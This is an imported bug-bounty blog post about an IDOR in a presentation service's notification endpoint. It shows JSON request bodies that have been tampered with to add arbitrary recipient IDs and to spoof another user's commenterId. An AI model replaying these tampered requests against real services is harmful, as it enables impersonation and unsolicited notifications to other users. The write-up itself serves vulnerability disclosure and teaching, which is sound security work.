---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-12-31_story-of-an-idor-via-http.md
original_filename: 2019-12-31_story-of-an-idor-via-http.md
title: Story of an IDOR via HTTP
category: documents
detected_topics:
- idor
- xss
- command-injection
- automation-abuse
tags:
- imported
- documents
- idor
- xss
- command-injection
- automation-abuse
language: en
raw_sha256: a26addb29f04ebd1c1c484bfb207d506ac34b80f31a3dfb26e60a9e083b2ac99
text_sha256: e25ad125adf2aa7b5ee573fabd29c8cb07af9aa6cb6a8c5ba1007625c302c438
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: false
---

# Story of an IDOR via HTTP

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-12-31_story-of-an-idor-via-http.md
- Source Type: markdown
- Detected Topics: idor, xss, command-injection, automation-abuse
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: False
- Raw SHA256: `a26addb29f04ebd1c1c484bfb207d506ac34b80f31a3dfb26e60a9e083b2ac99`
- Text SHA256: `e25ad125adf2aa7b5ee573fabd29c8cb07af9aa6cb6a8c5ba1007625c302c438`


## Content

---
title: "Story of an IDOR via HTTP"
page_title: "cat ~/footstep.ninja/blog.txt"
url: "https://footstep.ninja/posts/idor-via-http/"
final_url: "https://footstep.ninja/posts/idor-via-http/"
authors: ["Shuaib Oladigbolu (@_sawzeeyy)"]
bugs: ["IDOR"]
publication_date: "2019-12-31"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4850
---

# Story of an IDOR via HTTP

  * Dec 31, 2019
  * 2 min read

Oh! Yea, HTTP is the most common channel you could find an Insecure Direct Object Reference (IDOR) Vulnerability (IMO). I should call this an IDOR series, hahah!

In my last [post](https://footstep.ninja/posts/idor-via-websockets/), I mentioned there was a vulnerable HTTP PUT request on the target. The request was meant to send notification to other members of a team about a comment. The same endpoint was also used to notify other users when they are shared a slide. And both happened to be vulnerable to IDOR!

What could we do?

  1. Notify users they have been shared a deck
  2. Notify users about a comment
  3. Send comment notification on behalf of another user
  4. HTML Injection (I’ll discuss this in another post to keep things organized!)

![Do you believe that?](https://media.giphy.com/media/xUPOqcwlSS1xaClRJe/giphy.gif)

### Notify users they have been shared a deck

The body of PUT request looks like the following for sharing a deck
  
  
  {"recipients":[{"type":"User","id":"12345678"}],"teamAlias":"EEqSBdu9z49","data":{"presentationUUID":"x14r5K1tFnH","comment":"Good stuff","senderProfileImage":"","text":"shared a deck"},"type":"DeckShare"}
  

#### Could you identify the vulnerable parameter?

Yes the `id` within the `recipients` parameter. And I could send the same notification to every other user by adding more users to the array which looks like the following:
  
  
  {"recipients":[{"type":"User","id":"12345678"},{"type":"User","id":"12345679"},{"type":"User","id":"12345670"}],"teamAlias":"EEqSBdu9z49","data":{"presentationUUID":"x14r5K1tFnH","comment":"Good stuff","senderProfileImage":"","text":"shared a deck"},"type":"DeckShare"}
  

### Notify users about a comment

And for a comment notification, it looked like this:
  
  
  {"type":"SlideComment","recipients":[],"teamAlias":"EEqSBdu9z49","data":{"comment":"Comments are great!","commenterId":"01234567","commenterProfileImage":"","presentationUUID":"x14r5K1tFnH","presentationTitle":"","slideLocalId":"5p3nrib"}}
  

#### Here, apart from the `commenterId` what else do you notice?

Oh! Yes, the `recipients`. It was an empty array but then adding users like in the vulnerability to notify users about a shared deck works. The body now looks like the following:
  
  
  {"type":"SlideComment","recipients":[{"type":"User","id":"12345678"},{"type":"User","id":"12345679"},{"type":"User","id":"12345670"}],"teamAlias":"EEqSBdu9z49","data":{"comment":"Comments are great!","commenterId":"01234567","commenterProfileImage":"","presentationUUID":"x14r5K1tFnH","presentationTitle":"","slideLocalId":"5p3nrib"}}
  

### Send comment notification on behalf of another user

Also, the obvious `commenterId` in the previous body could be replaced with the id of any other user. And then one is able to notify users about a comment on behalf of another user.

![Hope you're convinced](https://media.giphy.com/media/xUPGcAgBgQqZQnfhJu/giphy.gif)

Thank you for your time. And I hope you enjoyed reading this.

Share on [](https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffootstep.ninja%2fposts%2fidor-via-http%2f)[](https://twitter.com/intent/tweet/?text=I%20just%20read%20"Story%20of%20an%20IDOR%20via%20HTTP"&url=https%3a%2f%2ffootstep.ninja%2fposts%2fidor-via-http%2f)[](mailto:?subject=I%20just%20read%20"Story%20of%20an%20IDOR%20via%20HTTP"&body=https%3a%2f%2ffootstep.ninja%2fposts%2fidor-via-http%2f)[](https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffootstep.ninja%2fposts%2fidor-via-http%2f&title=I%20just%20read%20"Story%20of%20an%20IDOR%20via%20HTTP"&summary=I%20just%20read%20"Story%20of%20an%20IDOR%20via%20HTTP"&source=https%3a%2f%2ffootstep.ninja%2fposts%2fidor-via-http%2f)[](https://reddit.com/submit/?url=https%3a%2f%2ffootstep.ninja%2fposts%2fidor-via-http%2f&resubmit=true&title=I%20just%20read%20"Story%20of%20an%20IDOR%20via%20HTTP")[](whatsapp://send?text=I%20just%20read%20"Story%20of%20an%20IDOR%20via%20HTTP"%20https%3a%2f%2ffootstep.ninja%2fposts%2fidor-via-http%2f)[](https://news.ycombinator.com/submitlink?u=https%3a%2f%2ffootstep.ninja%2fposts%2fidor-via-http%2f&t=I%20just%20read%20"Story%20of%20an%20IDOR%20via%20HTTP")[](https://telegram.me/share/url?text=I%20just%20read%20"Story%20of%20an%20IDOR%20via%20HTTP"&url=https%3a%2f%2ffootstep.ninja%2fposts%2fidor-via-http%2f)
